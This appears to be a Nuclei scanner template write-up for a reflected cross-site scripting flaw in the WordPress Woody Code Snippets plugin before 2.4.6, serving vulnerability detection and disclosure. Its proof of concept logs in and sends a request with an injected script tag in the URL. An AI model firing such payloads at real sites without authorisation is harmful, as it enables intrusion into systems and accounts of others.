# Nuclei Template: WordPress Woody Code Snippets <2.4.6 - Cross-Site Scripting
**Template ID:** wp-insert-php-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-insert-php-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Woody Code Snippets plugin before 2.4.6 contains a cross-site scripting vulnerability. It does not escape generated URLs before outputting them back in an attribute.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/6d6761b7-0c17-4428-8748-2179732030a3
